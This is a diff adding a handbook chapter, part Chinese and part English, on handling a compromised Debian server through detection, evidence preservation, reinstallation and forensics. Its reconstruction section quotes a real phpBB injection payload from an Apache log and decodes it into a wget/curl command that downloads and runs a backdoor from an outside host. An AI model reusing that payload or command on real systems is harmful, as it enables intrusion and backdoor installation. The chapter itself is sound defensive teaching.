+      <para>攻击者控制你的机器，然后用它作为基础（称为“中继系统”）执行其他恶意活动，会导致你法律上的麻烦。因为被攻击方最初会看到攻击源于你的系统，会把你当做攻击者（或者共犯）。在许多情况下，攻击者会使用你的服务器作为垃圾邮件的中继，这并不会有大的影响（除了将你列为黑名单，并限制发送合法邮件），但也不舒服。其他情况下，可能从你的机器产生更大的麻烦，譬如拒绝服务攻击。因为正常服务不可用，数据被损坏，这有时会导致收入损失；有时这也包含着实实在在的成本，因为被攻击方可能启动法律程序。如果未授权的拷贝通过你的服务器共享，版权所有者可以起诉你，以及其他遵从服务级别协议的公司－如果从你的机器遭受攻击，他们必须受到惩罚。</para>
+
+      <para>如果此类情况发生了，自称清白通常是不够的；至少，你要出示在你系统上进行可疑活动源于指定 IP 的证据。这几乎是不可能的，如果你忽略了本章的建议，让攻击者获得特权账户（特别是超级用户）并使用它来掩盖痕迹。</para>
+    </section>
+  </section>
+  <section id="sect.dealing-with-compromised-machine">
+    <title>处理被攻陷的机器</title>
+
+    <para>尽管有最好的意图和精心设计的安全策略，管理员最终还是会面对劫持行为。本节提供一些指导，介绍碰到这种情况时如何应对。</para>
+    <section>
+      <title>探测并观察黑客入侵</title>
+
+      <para>对付侵入的第一步是要注意黑客的这种行为。它通常不是自明的，特别是在没有足够的监控措施时。</para>
+
+      <para>破解行为通常不能被侦测到，除非这些行为对宿主机上的正常服务产生了直接影响，例如连接减缓，某些用户不能连接，或者其他类型的故障。面对这些问题，管理员需要好好看看机器并仔细检查异常行为。这时通常会发现异常进程，譬如名为 <literal>apache</literal> 而非标准的 <literal>/usr/sbin/apache2</literal>。按照这个例子，接下来要做的是注意进程标识，并检查 <filename>/proc/<replaceable>pid</replaceable>/exe</filename> 看看此进程当前运行的是什么程序：</para>
+
+      <screen>
+<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
+<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
+      </screen>
+
+      <para>一个程序安装在 <filename>/var/tmp/</filename> 并作为网页服务器运行？毋庸置疑，机器已经被攻陷了。</para>
+
+      <para>此处只是一个示例，但是其他提示也会给管理员敲响警钟：</para>
+      <itemizedlist>
+        <listitem>
+	  <para>命令的某个选项不起作用了；命令自己声明的软件版本与根据 <command>dpkg</command> 安装的预期版本不一致；</para>
+        </listitem>
+        <listitem>
+	  <para>命令行提示或者会话问候显示最后的连接源于其他洲的未知服务器；</para>
+        </listitem>
+        <listitem>
+	  <para><filename>/tmp/</filename> 分区已经被错误填满，而且都是由于非法的电影拷贝产生的；</para>
+        </listitem>
+        <listitem>
+	  <para>等等。</para>
+        </listitem>
+      </itemizedlist>
+    </section>
+    <section>
+      <title>把服务器下线</title>
+
+      <para>除了非常特殊的情况，破解一般源于网络，攻击者需要连接网络达到目的地（读取机密数据，共享非法文件，使用中继隐藏身份，等等）。将计算机从网络上拔出会阻止攻击者达到这些目标，即使是他们还没能成功攻陷电脑。</para>
+
+      <para>This may only be possible if the server is physically
+      accessible. When the server is hosted in a hosting provider's data
+      center halfway across the country, or if the server is not accessible
+      for any other reason, it's usually a good idea to start by gathering
+      some important information (see <xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />,
+      <xref linkend="sect.forensic-analysis" /> and
+      <xref linkend="sect.reconstituting-the-attack-scenario" />), then isolating
+      that server as much as possible by shutting down as many services as
+      possible (usually, everything but <command>sshd</command>). This case
+      is still awkward, since one can't rule out the possibility of the
+      attacker having SSH access like the administrator has; this makes it
+      harder to “clean” the machines.</para>
+    </section>
+    <section id="sect.keeping-everything-that-could-be-used-as-evidence">
+      <title>保留所有可以作为证据的东西</title>
+
+      <para>要知道针对攻击者的反击和从事法律活动需要所有重要元素的复本；包括硬盘内容，所有允许进程的清单，所有打开连接的清单。RAM 的内容也可以被使用，但是实践中很少使用。</para>
+
+      <para>在斗争最激烈的时候，管理员往往倾向于在感染电脑上执行许多检查；这通常不是一个好主意。每个命令都有可能已经被更改了并有可能擦除证据片段。检查应该限制在最小范围内（对于网络连接 <command>netstat -tupan</command>，列出所有进程 <command>ps auxf</command>，正在运行程序的信息 <command>ls -alR /proc/[0-9]*</command>），每个已进行过的检查都要仔细记下来。</para>
+
+      <sidebar>
+        <title><emphasis>注意</emphasis> 在线分析</title>
+
+	<para>尽管在运行时分析系统看起来很有诱惑力，特别是在不能接近服务器的时候，但是最好避免这种情况：原因很简单，你不能信任当前安装在被感染系统上的任何程序。被更改的 <command>ps</command> 命令很容易就能隐藏一些进程，或者被更改的 <command>ls</command> 隐藏一些文件，有时候甚至内核也可能被感染！</para>
+
+	<para>如果仍然需要在线分析，要注意只使用已知的可信任程序。比较好的方法是使用含有简单程序的救援 CD，或者只读的网络共享。然而，如果内核本身被感染，这些措施也无济于事。</para>
+      </sidebar>
+
+      <para>一旦“动态”元素已经被保存，下一步就是存储整个硬盘镜像。如果文件系统仍在变化，是不可能制作镜像的，就需要以只读方式挂载。最简单的办法是（在运行 <command>sync</command> 后）直接停机并使用救援 CD 重启系统。每个分区使用类似 <command>dd</command> 来拷贝；这些镜像可以发送到其他服务器（可以使用很方便的 <command>nc</command> 工具）。另一种可能更简单：把磁盘从机器里取出来并使用新的替代它，从新格式化，重装系统。</para>
+    </section>
+    <section>
+      <title>重新安装</title>
+      <indexterm><primary>后门</primary></indexterm>
+
+      <para>The server should not be brought back on line without a
+      complete reinstallation. If the compromise was severe (if
+      administrative privileges were obtained), there is almost no other
+      way to be sure that we get rid of everything the attacker may have
+      left behind (particularly <emphasis>backdoors</emphasis>). Of course,
+      all the latest security updates must also be applied so as to plug
+      the vulnerability used by the attacker. Ideally, analyzing the attack
+      should point at this attack vector, so one can be sure of actually
+      fixing it; otherwise, one can only hope that the vulnerability was
+      one of those fixed by the updates.</para>
+
+      <para>从新安装远程服务器并不容易；可能要托管公司协助，因为并不是所有公司都提供自动重装系统。注意，不要使用被感染之后的系统备份来安装机器。只有数据应当被恢复，实际使用的软件应该从安装媒介重新安装。</para>
+    </section>
+    <section id="sect.forensic-analysis">
+      <title>法医分析</title>
+
+      <para>现在服务被恢复，是时候看看感染系统的磁盘镜像，找到攻击向量了。当加载这些镜像是，注意使用 <literal>ro,nodev,noexec,noatime</literal> 选项来避免改变其内容（包括读取文件的时间戳）或者误运行感染程序。</para>
+
+      <para>追踪痕迹通常需要寻找任何被更改和执行的东西：</para>
+      <itemizedlist>
+        <listitem>
+	  <para><filename>.bash_history</filename> 文件可用于查阅；</para>
+        </listitem>
+        <listitem>
+	  <para>也会列出最近创建，修改和读取的文件；</para>
+        </listitem>
+        <listitem>
+	  <para><command>strings</command> 通过从二进制中提取字符串，可辅助用于识别攻击者安装的程序；</para>
+        </listitem>
+        <listitem>
+	  <para><filename>/var/log/</filename> 日志文件可重建事件记录；</para>
+        </listitem>
+        <listitem>
+	  <para>特殊用途的工具可用于恢复潜在被删除的文件，包括攻击者删除的日志文件。</para>
+        </listitem>
+      </itemizedlist>
+
+      <para>
+        Some of these operations can be made easier with specialized
+        software. In particular, the <emphasis role="pkg">sleuthkit</emphasis>
+        package provides many tools to analyze a filesystem. Their use is
+        made easier by the <emphasis>Autopsy Forensic Browser</emphasis>
+        graphical interface (in the <emphasis role="pkg">autopsy</emphasis> package).
+      </para>
+      <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>
+      <indexterm><primary>The Sleuth Kit</primary></indexterm>
+    </section>
+    <section id="sect.reconstituting-the-attack-scenario">
+      <title>重构攻击场景</title>
+
+      <para>在分析过程中搜集到的所有元素应该像拼图一片一片组合起来；第一个可疑文件通常和提供突破口的日志文件相关。现实世界中的例子比冗长的理论明了。</para>
+
+      <para>下面的日志文件截取自 Apache <filename>access.log</filename>：</para>
+
+      <programlisting>
+www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+      </programlisting>
+
+      <para>这个例子正是利用了 phpBB 中的一个老安全漏洞。<ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" /></para>
+
+      <para>破译这段 URL 就会明白，攻击者成功运行了一些 PHP 代码，即：<command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>。实际上，在<filename>/tmp/</filename>会发现一个 <filename>bd</filename> 文件。运行 <command>strings /mnt/tmp/bd</command> 会发现字符串 <literal>PsychoPhobia Backdoor is starting...</literal>。这也确实看起来像个后门。</para>
+
+      <para>随后，访问权限会被用来下载，安装和运行连接到地下 IRC 网络的 <emphasis>机器人－bot</emphasis>。这个机器人通过 IRC 协议控制，用于下载文件并共享。程序甚至有自己的日志文件：</para>
+
+      <programlisting>** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
+** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
+** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
+** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
+** 2004-11-29-19:50:20: DCC CHAT Correct password
+(...)
+** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
+(...)
+** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
+(...)
+** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
+(...)
+** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)</programlisting>
+
+      <para>跟踪记录显示有两个视频文件被存储在服务器上了。</para>
+
+      <para>同时，攻击者也下载了一对额外文件，<filename>/tmp/pt</filename> 和 <filename>/tmp/loginx</filename>。运行 <command>strings</command> 命令分析文件会发现诸如<foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> 和 <foreignphrase>Now wait for suid shell...</foreignphrase>。这些看起来像是程序利用本地漏洞获取管理员特权。他们达到目的了吗？本例中，视乎没有，因为在他们开始活动之后，看起来没有文件被修改。</para>
+
+      <para>本例中，整个入侵过程被重构。可以推断，攻击者已经能够利用被侵入的系统三天左右；分析的成果在于漏洞已经被识别出来，并且管理员可以确保在下一次安装时确实修复了该漏洞。</para>
+    </section>
+  </section>
+</chapter>
